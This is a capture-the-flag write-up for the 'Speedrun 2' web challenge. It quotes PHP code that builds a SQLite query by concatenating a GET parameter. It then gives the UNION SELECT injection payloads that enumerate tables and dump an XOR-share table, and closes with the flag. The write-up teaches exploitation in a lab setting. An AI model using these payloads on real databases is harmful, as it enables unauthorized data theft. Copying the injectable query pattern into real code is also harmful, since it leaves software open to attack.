# Speedrun 2

Web<br/>


### Description
[challenges.ctfd.io:30026](challenges.ctfd.io:30026)

<br/><br/><br/>

### Solution

#### Discovery
Visiting the site, we get an array and some php code<br/>
````PHP
<?php

    $dbhandle = new PDO("sqlite:../uni.db") or die("Failed to open DB");
    if (!$dbhandle) die ($error);

    $credits = 3;
    if (isset($_GET["credits"])){
      $credits = $_GET["credits"];
    }
    $query = "select * from course where credits=".$credits;
    $statement = $dbhandle->prepare($query);
    $statement->execute();
    $results = $statement->fetchAll(PDO::FETCH_ASSOC);

    echo json_encode($results);
    echo highlight_file(__FILE__, true);
?>
````
Quite evidently, we are supposed to use SQL injection<br/>
We first test out by setting `$_GET["credits"]` to `3+UNION+SELECT+*+FROM+course` ([link](http://challenges.ctfd.io:30026/?credits=3+UNION+SELECT+*+FROM+course))<br/>
We can see that indeed, SQL injection works and we see some courses with 4 credits<br/>
We also note that this uses sqlite database<br/>

#### Finding tables
The structure of the results is that there are 4 components, `course_id`, `title`, `dept_name`, and `credits`<br/>
Hence, our injected code should also return 4 components<br/>
We set `$_GET["credits]` to `0+UNION+SELECT+1,+2,+3,+tbl_name+FROM+sqlite_master` ([link](http://challenges.ctfd.io:30026/?credits=0+UNION+SELECT+1,+2,+3,+tbl_name+FROM+sqlite_master))<br/>
We thus find the available tables<br/>
````
advisor
classroom
course
department
flag_xor_shares
grade_points
instructor
prereq
section
student
takes
teaches
time_slot
````

#### Crypto
We select the flag_xor_shares table, and get some interesting results ([link](http://challenges.ctfd.io:30026/?credits=0+UNION+SELECT+1,+2,+*+FROM+flag_xor_shares))<br/>
````
7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76
835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1
9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c
53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3
6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35
````
We thus use a tool to XOR each line with the following, and finally arrive at the flag<br/>

<br/>
> UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}